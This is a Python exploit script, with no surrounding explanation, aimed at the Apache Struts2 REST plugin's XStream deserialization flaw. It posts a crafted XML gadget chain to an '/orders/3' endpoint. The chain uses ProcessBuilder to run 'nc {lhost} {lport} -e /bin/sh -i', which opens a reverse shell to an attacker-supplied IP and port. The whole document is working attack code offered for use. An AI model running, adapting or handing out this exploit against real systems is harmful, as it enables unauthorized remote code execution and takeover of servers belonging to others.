#!/usr/bin/env python3
import requests,argparse

parser = argparse.ArgumentParser()
parser.add_argument("--rhost","-r",help="The target HOST, example: 127.0.0.1",type=str,required=True)
parser.add_argument("--lhost","-l",help="LHOST - Your attack machine IP",type=str,required=True)
parser.add_argument("--lport","-p",help="LPORT - Your attack machine Port",type=str,required=True)
args = parser.parse_args()

def exploit(url,lhost,lport):
    print ("-----struts2 rest xstream REVERSE SHELL-----")
    host = ("http://"+url+"/orders/3")
    headers = {"Content-Type":"application/xml"}
    payload = (f"nc {lhost} {lport} -e /bin/sh -i")
    data = f"""<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>/bin/sh</string><string>-c</string><string>{payload}</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>LWtm39xvwsIOr8c7K</name>
                  </filter>
                  <next class="string">hGAXY2qqVrvY2WOFTl3</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
"""
    r = requests.post(host,data=data,headers=headers)
    if (r.status_code == 500): 
        return ("[+] Sending your reverse shell: "+payload)
    else:
        pass    
print (exploit(args.rhost,args.lhost,args.lport))

